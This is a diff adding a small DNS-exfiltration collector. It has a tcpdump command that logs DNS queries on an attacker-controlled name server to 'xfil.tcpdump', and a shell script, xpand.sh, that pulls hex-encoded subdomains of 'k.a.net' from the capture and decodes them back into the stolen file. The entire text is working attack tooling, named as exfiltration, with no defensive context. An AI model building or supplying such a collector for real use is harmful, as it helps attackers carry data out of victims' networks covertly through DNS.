@@ -1,0 +1,18 @@
+# this listener will need to be running on DNS server to catch the dns queries
+tcpdump -vvv -s 0 -l -n port 53 > xfil.tcpdump
+
+
+# This script will parse the tcpdump file and extract the data
+
+#!/bin/sh
+
+usage (){
+  echo "USAGE: xpand.sh <file>"
+  exit 1
+}
+if [ $1 ]; then	
+  egrep -o "[0-9a-f]*.k.a.net" $1 | cut -d. -f1 | uniq >> $1.hex.out
+  xxd -r -p $1.hex.out > $1.xpand
+  
+else usage
+fi
